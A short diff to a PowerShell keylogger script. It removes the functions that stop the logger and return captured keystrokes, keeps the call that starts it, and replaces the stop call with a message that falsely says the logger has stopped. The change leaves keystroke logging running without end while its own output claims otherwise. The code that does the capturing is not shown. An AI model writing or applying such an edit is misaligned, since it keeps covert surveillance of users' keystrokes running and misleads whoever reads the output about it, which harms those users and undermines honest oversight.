@@ -14,19 +14,9 @@ function Start-KeyLogger {
     [KeyLogger]::Start() 
 }
 
-function Stop-KeyLogger {
-    Write-Output "Stopping KeyLogger..."
-    [KeyLogger]::Stop()
-}
-
-function Get-KeyPresses {
-    return [KeyLogger]::GetKeyPresses()
-}
-
 # Call the function to start the keylogger
 Start-KeyLogger
 
-# Stop the keylogger
-Stop-KeyLogger
+Write-Output "KeyLogger stop condition triggered."
 
 # ...existing code...
